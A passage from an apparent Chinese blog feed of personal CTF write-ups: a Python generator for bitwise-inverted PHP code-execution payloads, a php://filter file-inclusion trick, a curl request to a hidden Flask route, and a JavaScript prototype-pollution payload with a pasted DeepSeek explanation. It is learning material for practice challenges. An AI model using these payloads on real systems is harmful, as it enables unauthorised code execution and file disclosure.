蔡总说：注意审题！！！<br></code></pre></td></tr></table></figure><p>这都过滤了啥，给deepseek看看<br>d导思考了很久，给了几个payload，都无法起效  </p><p>上网一找，看来这种应该叫做无字母rec，如名字，就是无法传入字母字符啥的<br><a href="https://www.cnblogs.com/pursue-security/p/15404150.html">https://www.cnblogs.com/pursue-security/p/15404150.html</a>  </p><p>故叫d导帮写了个脚本来构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_neg_payload</span>(<span class="hljs-params">s</span>):<br>    payload = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        neg = (~<span class="hljs-built_in">ord</span>(c)) &amp; <span class="hljs-number">0xFF</span>  <span class="hljs-comment"># 取反并转换为无符号字节</span><br>        payload.append(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;neg:02X&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_command</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-comment"># 匹配 function(&#x27;argument&#x27;) 格式</span><br>    pattern = <span class="hljs-string">r&#x27;^\s*?(\w+?)\s*?\(\s*?[\&#x27;&quot;](.*?)[\&#x27;&quot;]\s*?\)\s*?;?&#x27;</span><br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(pattern, cmd)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;命令格式错误！请使用 function(&#x27;argument&#x27;) 格式&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入PHP命令（示例：system(&#x27;ls /&#x27;)：&quot;</span>).strip()<br>    <span class="hljs-keyword">try</span>:<br>        func, arg = parse_command(cmd)<br>        <br>        <span class="hljs-comment"># 生成函数名和参数的取反payload</span><br>        func_neg = generate_neg_payload(func)<br>        arg_neg = generate_neg_payload(arg)<br>        <br>        payload = <span class="hljs-string">f&quot;(~<span class="hljs-subst">&#123;func_neg&#125;</span>)(~<span class="hljs-subst">&#123;arg_neg&#125;</span>);&quot;</span><br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n生成的取反Payload：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n使用说明：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. 需要目标环境开启短标签支持&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. 确保PHP版本支持这种调用方式&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. 实际使用时可能需要URL编码整个payload&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4. 示例最终形式：?code=~%8C%86%8C%8B%9A%92~%93%8C%DF%D0&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%93%8C);<br><br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);<br><br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>); <br>生成的取反Payload：<br>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);<br></code></pre></td></tr></table></figure><h1 id="SWPUCTF-2022-新生赛-ez-ez-php"><a href="#SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php"></a>[SWPUCTF 2022 新生赛]ez_ez_php</h1><p>开题给源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">&quot;php&quot;</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nice!!!&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <br><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure><p>源码大概意思是有个substr函数截取file传入参数前3位，所以前3位得是’php’，这直接就是提示伪协议了啊</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">NSSCTF&#123;flag<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_n</span>ot<span class="hljs-number">_</span>here&#125;<br>real<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span><span class="hljs-keyword">in</span><span class="hljs-number">_</span><span class="hljs-string">&#x27;flag&#x27;</span><br>换个思路，试试PHP伪协议呢<br></code></pre></td></tr></table></figure><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag<br>拿到正确flag，但是啊但是</p><p>尽然直接访问&#x2F;flag 就能拿</p><h1 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h1><p>打开题目是一个假按钮，扫了一下发现&#x2F;src有如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> flask<br><br>app = flask.Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>) </span><span class="hljs-comment">## GET 方式访问 / 就返回index.html</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>  <span class="hljs-keyword">return</span> flask.send_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>  <span class="hljs-keyword">return</span> flask.send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/super-secret-route-nobody-will-guess&#x27;</span>, methods=[<span class="hljs-string">&#x27;PUT&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>老规矩，先问d导  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT http://node5.anna.nssctf.cn:28256/super-secret-route-nobody-will-guess<br></code></pre></td></tr></table></figure><p>直接返回flag，行，看看源码<br>好像是规定了几个条件  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## GET 方式访问 / 就返回index.html</span><br><span class="hljs-comment">## GET 方式访问 /src 就返回 app.py</span><br><span class="hljs-comment">## PUT 方式访问 /super-secret-route-nobody-will-guess 就打开flag，然后read它</span><br></code></pre></td></tr></table></figure><p>那我猜这可能是一个python后端？<br>以前也没见过，那现在知道了</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-35</title>
    <link href="/2025/05/14/note-35/"/>
    <url>/2025/05/14/note-35/</url>
    
    <content type="html"><![CDATA[<h1 id="Mini-L-CTF-Click-and-Click"><a href="#Mini-L-CTF-Click-and-Click" class="headerlink" title="Mini L-CTF Click and Click"></a>Mini L-CTF Click and Click</h1><p>tags: java原型链污染</p><p>当初没做出来，去西电CTF平台复现<br>官方wp：<br>先用JavaScript在浏览器控制台刷够10000  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">but = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#app &gt; main &gt; div &gt; button&quot;</span>)<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>    but.<span class="hljs-title function_">click</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>在bp上看到 http 历史记录<br>发现是没50次发一次包<br>过了1000次后服务器一直回显“按的太快了”<br>回显内容：  </p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs d">什么叫“前后端分离”啊？（战术后仰）<br><br><span class="hljs-keyword">if</span> ( req.<span class="hljs-keyword">body</span>.point.amount == <span class="hljs-number">0</span> || req.<span class="hljs-keyword">body</span>.point.amount == <span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">delete</span> req.<span class="hljs-keyword">body</span>.point.amount &#125;<br><br>条件判断：检查 req.<span class="hljs-keyword">body</span>.point.amount 的值是否是 <span class="hljs-number">0</span> 或 <span class="hljs-literal">null</span>。<br>操作：如果满足条件，删除 req.<span class="hljs-keyword">body</span>.point.amount 属性。<br></code></pre></td></tr></table></figure><p>官方的最终payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;set&quot;</span>,<br>  <span class="hljs-string">&quot;point&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">10000</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看官方wp思路，就是set amount为零，触发删除amount<br>此时因为amount已经被删除，当调用到point对象里的amount属性时会查询不到，<br>此时java的特性是会去查询他的父对象是否有amount这个属性，若是有，amount就会采用他父对象的值    </p><p>DeepSeek:这个__proto__ 是对象访问原型链的入口，通过它可以直接修改对象的“父对象”（原型）  </p><p>而我们通过设置__proto__的属性，给他添加一个amount属性，当java查询point的amount属性时因为被删除，所以就会去查询__proto__<br>此时若我们给了__proto__一个amount值，这时__proto__的amount值就会变成point的amount值，达到了绕过  </p><h2 id="与deepseek的对话"><a href="#与deepseek的对话" class="headerlink" title="与deepseek的对话"></a>与deepseek的对话</h2><h2 id="我的提问："><a href="#我的提问：" class="headerlink" title="我的提问："></a>我的提问：</h2><p>我对__proto__的作用不太理解，说明一下啊，我没接触过多少java</p><h2 id="AI回复："><a href="#AI回复：" class="headerlink" title="AI回复："></a>AI回复：</h2><p>已深度思考（用时 22 秒）</p><p>好的，用户之前一直在询问关于CTF题目中的原型链污染漏洞，特别是关于__proto__的作用。现在用户提到自己对__proto__的作用不太理解，并且提到没有接触过多少JavaScript，这说明用户可能是一个刚开始学习JavaScript的新手，或者在CTF中遇到了这个概念，但缺乏相关的背景知识。</p><p>首先，我需要确认用户的核心问题：理解__proto__在JavaScript中的作用，以及它如何导致原型链污染。用户之前的问题已经涉及到了原型链污染的攻击步骤，但可能对原型链本身的概念还不清楚，尤其是作为JavaScript的新手，需要从基础讲起。</p><p>接下来，我需要考虑如何用简单易懂的语言解释原型链和__proto__。用户可能对面向对象编程中的继承概念不太熟悉，或者对JavaScript的原型继承机制感到陌生。因此，需要用类比和具体的例子来帮助理解。</p><p>可能的步骤包括：</p><p>1. 解释JavaScript中的对象和原型链的基本概念。</p><p>2. 说明__proto__属性是什么，以及它如何指向对象的原型。</p><p>3. 演示如何通过修改__proto__来影响其他对象，进而导致原型链污染。</p><p>4. 结合之前的CTF题目，说明攻击者如何利用这一点。</p><p>需要注意的是，用户可能没有接触过构造函数或prototype属性，所以需要避免使用过于专业的术语，或者如果必须使用，要确保有足够的解释。同时，用户可能需要更多的实际例子来理解抽象的概念。</p><p>另外，用户之前的对话中提到“没接触过多少java”，这里可能存在笔误，用户可能指的是JavaScript，而不是Java。需要确认这一点，但在上下文中应该是JavaScript，因为讨论的是CTF中的JS漏洞。</p><p>在解释过程中，应避免使用复杂的代码示例，或者如果使用代码，要逐行解释其作用。同时，使用比喻或现实中的类比来帮助用户形成直观的理解，比如家族树、继承链等。</p><p>还需要强调为什么原型链污染是危险的，以及在实际开发中如何防止这种漏洞。这不仅能帮助用户理解攻击原理，还能增强他们的安全意识。</p><p>最后，总结关键点，确保用户能够抓住核心概念，并可能提供进一步的学习资源或练习建议，以巩固理解。</p><p>好的！我来用最简单的方式解释 <code>__proto__</code> 和原型链的概念，即使你完全没接触过 JavaScript 也能理解。我们从“对象”和“继承”这两个核心概念说起。</p><hr><h3 id="1-JavaScript中的对象"><a href="#1-JavaScript中的对象" class="headerlink" title="1. JavaScript中的对象"></a><strong>1. JavaScript中的对象</strong></h3><p>JavaScript 中几乎所有东西都是<strong>对象</strong>（比如数字、字符串、数组等都可以用对象的形式操作）。对象可以理解为一个“盒子”，里面装着<strong>属性</strong>（键值对）。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">// 一个简单的对象</span><br>    <span class="hljs-keyword">const</span> cat = &#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;喵喵&quot;</span>,<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;喵~&quot;</span>); &#125;<br>    &#125;;<br><br>这个 <span class="hljs-string">`cat`</span> 对象有属性 <span class="hljs-string">`name`</span>、<span class="hljs-string">`age`</span> 和方法 <span class="hljs-string">`say()`</span>。<br></code></pre></td></tr></table></figure><hr><h3 id="2-什么是原型链（Prototype-Chain）？"><a href="#2-什么是原型链（Prototype-Chain）？" class="headerlink" title="2. 什么是原型链（Prototype Chain）？"></a><strong>2. 什么是原型链（Prototype Chain）？</strong></h3><p>JavaScript 的继承机制是通过<strong>原型链</strong>实现的。简单来说：</p><ul><li><p><strong>每个对象都有一个“爸爸”（原型对象）</strong>。</p></li><li><p>如果访问一个对象的属性（比如 <code>cat.color</code>），但对象自己没有这个属性，JavaScript 会自动去它的“爸爸”对象里找。</p></li><li><p>如果“爸爸”也没有，就去“爷爷”对象里找……直到找到或者没有更高层的“祖先”（原型链顶端是 <code>null</code>）。</p></li></ul><p>这种<strong>链式查找机制</strong>就是原型链。</p><hr><h3 id="3-proto-的作用"><a href="#3-proto-的作用" class="headerlink" title="3. __proto__ 的作用"></a><strong>3. <code>__proto__</code> 的作用</strong></h3><p><code>__proto__</code> 是对象的一个<strong>隐藏属性</strong>（现在更推荐用 <code>Object.getPrototypeOf()</code> 获取），它直接指向对象的“爸爸”（原型对象）。</p><h4 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a><strong>举个例子：</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 创建一个对象</span><br><span class="hljs-keyword">const</span> animal = &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;动物&quot;</span> &#125;;<br><span class="hljs-keyword">const</span> cat = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;喵喵&quot;</span> &#125;;<br><br><span class="hljs-comment">// 手动设置 cat 的“爸爸”是 animal</span><br>cat.<span class="hljs-property">__proto__</span> = animal;<br><br><span class="hljs-comment">// 访问 cat.type</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">type</span>); <span class="hljs-comment">// 输出 &quot;动物&quot;（从“爸爸”animal继承）</span><br></code></pre></td></tr></table></figure><ul><li><p><code>cat</code> 自己没有 <code>type</code> 属性。</p></li><li><p>但因为 <code>cat.__proto__</code> 指向 <code>animal</code>，所以会去 <code>animal</code> 里找 <code>type</code>。</p></li><li><p>这就是<strong>继承</strong>！</p></li></ul><hr><h3 id="4-原型链污染的原理"><a href="#4-原型链污染的原理" class="headerlink" title="4. 原型链污染的原理"></a><strong>4. 原型链污染的原理</strong></h3><p>假设我们修改了一个对象的“爸爸”（原型对象），那么<strong>所有继承这个“爸爸”的对象都会受到影响</strong>！</p><h4 id="污染示例："><a href="#污染示例：" class="headerlink" title="污染示例："></a><strong>污染示例：</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">// 普通对象</span><br>    <span class="hljs-keyword">const</span> obj1 = &#123;&#125;;<br>    <span class="hljs-keyword">const</span> obj2 = &#123;&#125;;<br>    <br>    <span class="hljs-comment">// 污染 Object.prototype（所有对象的“爷爷”）</span><br>    obj1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">hacked</span> = <span class="hljs-string">&quot;被污染了！&quot;</span>;<br>    <br>    <span class="hljs-comment">// 所有对象都会继承这个属性！</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">hacked</span>); <span class="hljs-comment">// 输出 &quot;被污染了！&quot;</span><br><br>*   <span class="hljs-string">`Object.prototype`</span> 是几乎所有对象的“爷爷”。<br>    <br>*   修改它后，所有对象（如 <span class="hljs-string">`obj2`</span>）都会自动继承 <span class="hljs-string">`hacked`</span> 属性。<br>    <br></code></pre></td></tr></table></figure><hr><h3 id="5-回到CTF题目中的攻击"><a href="#5-回到CTF题目中的攻击" class="headerlink" title="5. 回到CTF题目中的攻击"></a><strong>5. 回到CTF题目中的攻击</strong></h3><p>题目中的请求数据：</p><pre><code class="hljs">&#123;  &quot;point&quot;: &#123;    &quot;amount&quot;: 0,    &quot;__proto__&quot;: &#123; &quot;amount&quot;: 10000 &#125;  &#125;&#125;</code></pre><h4 id="攻击步骤："><a href="#攻击步骤：" class="headerlink" title="攻击步骤："></a><strong>攻击步骤：</strong></h4><ol><li><p><strong>设置 <code>amount: 0</code></strong>：触发后端代码 <code>delete req.body.point.amount</code>，删除对象自身的 <code>amount</code>。</p></li><li><p><strong>通过 <code>__proto__</code> 修改原型</strong>：将 <code>point</code> 对象的“爸爸”设置为一个包含 <code>amount: 10000</code> 的对象。</p></li><li><p><strong>继承伪造的 <code>amount</code></strong>：当后端检查 <code>point.amount</code> 时，由于自身属性被删除，会从“爸爸”那里继承 <code>amount: 10000</code>，从而绕过限制。</p></li></ol><hr><h3 id="6-类比理解"><a href="#6-类比理解" class="headerlink" title="6. 类比理解"></a><strong>6. 类比理解</strong></h3><p>想象你有一个家族：</p><ul><li><p><strong>你自己</strong>：有一个钱包（属性），但你把钱包扔了（<code>delete</code>）。</p></li><li><p><strong>你的爸爸</strong>：你偷偷修改了爸爸的钱包，往里塞了10000元（通过 <code>__proto__</code> 修改原型）。</p></li><li><p><strong>别人检查你的财产</strong>：发现你没钱包，于是看你爸爸的钱包，认为你有10000元！</p></li></ul><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li><p><code>__proto__</code> 是对象访问“爸爸”（原型）的入口。</p></li><li><p><strong>原型链污染</strong>就是通过修改“爸爸”的属性，影响所有“儿子”对象。</p></li><li><p>在CTF中，攻击者利用这一点伪造数据，绕过逻辑检查。</p></li></ul><p>这样解释清楚了吗？如果还有疑问，可以随时问我！ 😊</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Plan2</title>
    <link href="/2025/05/12/Plan2/"/>
    <url>/2025/05/12/Plan2/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="597e4f414f3d70f961c85daa40d3f24c54f4ce4ce2235637d9b9c23cbd2e9178">ac84844b14d8816060dbf8be1ca4bb2ec66f983b68e70a6c714f7a911d0014f0b5756a317b278399d624b30f4bf63d0eb00a8931da015dda16bf2fb37e196159887363880cbca328ec0d305c837f0b5b93a2a2e5d3a6692d0309a3554096f8ccae74823c2beb035a6b4de247c78699507b41d6bacb601f061172f57959471c4b1a1a8da1b1d092117e53cbb4a6f6958abf925eb5ca0828cc2a47e38eab0a8914e74918d7de0d97ecd6741397a8495d77a68d011c9026c6493258b8803204cfd38d5c50f1b0ecd75b56ecdcfe8b4f0c99bb7f64f04447b1faf9d9f942c488b6ca65c2c73e888be6f03ffb4c38aa8c2450505b86f35a762b231484f524ab2537ce5ac3884c0e6f264f6cf1d07e938bc3bf98e5cc5abdb49540569a482f415cc0588595ef231b03d82aecca77812af514cd5d3d1bb184950171fd202d826e2cf32286bd44dbf56199f9fc24f918229842a7be18181f60020aea37eaef2bcd483a0b2cd7b209ee11093658f1d4d5de6b052330b6938b33bb8d9bf6b9037f9054be5526fc4a3833f83711e05811615b8b60d8cdee7c6c0b260592090d872a5f14563d49379df1589d3a0c2e56ec899c6ed5d8a1ac35f146e914aa85bacdef50795158b1b289198d6c3656461a80356257d2ca61e495fe59727901367b2e882c79248c02ddd31e1aafce69f6dc9c4bdd2813346a73563d06f070aa5e14eab774b7237cd63b149179de51cb727fb85c108799f9fccc19b6ae9b1b658385e5b83598d2d3dc67f8c2f30d4801a4e98d335984b4314fd9c24ba7d308258d40d154768c628f1366de7d364c20b24f3c9b3f945a38d4f8e9cb306586cf27d1a2d4bea4568554ff8b1b3bfe0dad1430b38d7096243b234efc9351e657aef842592803429e943323b4d3fcfec68261f7b2bb665866574611662666363ae3d4b6c1afea86d28d6ab3ba21cc7982b41d09303c0b1b09132ddc828c39cbcf2ab4861586e6c7a32a57c5f0119b5da1cf49baaf48417afa5893f55de2756a8c1bcd7fdc6e84fe986388ca761b3b0f24f645cc52a226ea2b4be738d889d075c40cc68a62899052163a2a22e296c1fc66797e2250d4fa8029cb8e6c55a74c00c6c44857c1b90f42343eaa1f889299c19f661b109e49fd81fea4a6c4694f2cdeadf902da46b1c33415fe4bc158c84fac57c2af1139dc338e2a0c522496ef7e05e4e97fef29419005d26b34cac126fa06c1e5caec284835395e3cf76a1de60c86b4fec306077e2b8587b0cee51010f140e86a4b817f7b73d29d5091a4ccdecd46293bd18df0726ae6fb8a691c4a76376c0ea4fdddf46c697592479f5ceb46825ad523768da76f5947ea602c1e132675a641748c93659c2cae1e2368ad8b25f49815fa3e5bc4f2931538fe1d50ac56abc1c67ddde58ea4b26458de1a9e0a2937e01fc4ca595a259a6ada5d39d42b9ffe9bf0a9d7b614f56ecd53fe33e0a93a2fee30f2071de876f10122eb3a558dfffe8208a1e8f5abc30952bce6c1bdb03305811c22da25a2e53407d73eb2dc31406b8b93340e8a8599993ff80fbc6686580372f34fcb5f18d5d6bcaf71a8bebc450a9687ad0528ca785b4afef1aaff52df3bcaee504d718b9329d638089d9de64caf792d6573345139b706858948dc99207795fd5691bf2464056990ab895ac529859287e7bba9f5728c4538e5db19689f5845639679e5d17af50e00e16fceebab45015881466ddbce434990015defeffa14c17ccf4547c424522c9a4df5b9e5f0105140daa4b7fdf270091154e8c982fd3f243084425159bc4dc91aef78c489ed7b64fcef30ef76e017d64423409435ed211d73726e244abf7ceaf1965214af254d22177a315d576e11b7bea07d50b3342404139c9af16a4d0027b4f140dcea68352740eb1d4d0a3382fa193cde627e7fba578f21ba4c32c4f369116b11</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>plan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-34</title>
    <link href="/2025/05/11/note-34/"/>
    <url>/2025/05/11/note-34/</url>
    
